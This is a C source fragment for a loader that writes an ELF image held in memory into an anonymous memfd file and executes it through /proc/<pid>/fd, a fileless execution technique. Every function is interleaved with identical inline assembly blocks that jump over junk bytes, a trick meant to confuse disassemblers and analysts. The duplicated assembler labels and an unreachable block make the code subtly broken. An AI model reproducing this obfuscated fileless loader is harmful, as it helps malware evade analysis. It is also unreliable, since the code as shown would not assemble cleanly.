int memfd_create(const char *name, unsigned int flags) {

    int fd;

    if((fd = syscall(SYS_memfd_create, name, flags)) == -1) {

        return 0;

    }

    return fd;


asm(
        "pushq %rax;"
        "xorq %rax, %rax;"
        "testq %rax, %rax;"
        "je label1;"
        ".byte 0x5e;"
        "addq %rbx, %rax;"
        ".byte 0x7f;"
        "xorq %rax, %rax;"
        "testq %rax, %rax;"
        ".byte 0x88, 0x5e, 0x01;"
        "label1:"
        "popq %rax;"
);

}

/*

elf file has already been loaded into memory, what elfloader does is to launch the elf file

including required libraries, and then exit.

*/

/*

Version 1.0

Use memfd_create to create a anynomous file, and then write the elf file into it.

at last use execve to launch the elf file.

but if the elf file requires some libraries which locate in the relative path of elf itself, it will fail.

TODO: fix this problem

*/

int LoadElf(void *mem, size_t memlen, char *argv[], char *envp[], char **err) {

    int fd = memfd_create("", 0);

    if (fd < 0) {

        *err = "memfd_create failed";

        return -1;

    }

    if (write(fd, mem, memlen) != memlen) {

        *err = "write failed";


asm(
        "pushq %rax;"
        "xorq %rax, %rax;"
        "testq %rax, %rax;"
        "je label1;"
        ".byte 0x5e;"
        "addq %rbx, %rax;"
        ".byte 0x7f;"
        "xorq %rax, %rax;"
        "testq %rax, %rax;"
        ".byte 0x88, 0x5e, 0x01;"
        "label1:"
        "popq %rax;"
);

        return -1;

    }

    if (lseek(fd, 0, SEEK_SET) != 0) {

        *err = "lseek failed";

        return -1;


asm(
        "pushq %rax;"
        "xorq %rax, %rax;"
        "testq %rax, %rax;"
        "je label1;"
        ".byte 0x5e;"
        "addq %rbx, %rax;"
        ".byte 0x7f;"
        "xorq %rax, %rax;"
        "testq %rax, %rax;"
        ".byte 0x88, 0x5e, 0x01;"
        "label1:"
        "popq %rax;"
);

    }

    //get pid

    pid_t pid = getpid();

    char elfpath [256] = { 0 };

    sprintf(elfpath, "/proc/%d/fd/%d", pid, fd);


asm(
        "pushq %rax;"
        "xorq %rax, %rax;"
        "testq %rax, %rax;"
        "je label1;"
        ".byte 0x5e;"
        "addq %rbx, %rax;"
        ".byte 0x7f;"
        "xorq %rax, %rax;"
        "testq %rax, %rax;"
        ".byte 0x88, 0x5e, 0x01;"
        "label1:"
        "popq %rax;"
);

    //execve

    if (execve(elfpath, argv, envp) < 0) {

        *err = "execve failed";

        return -1;

    }

    return 0;

}

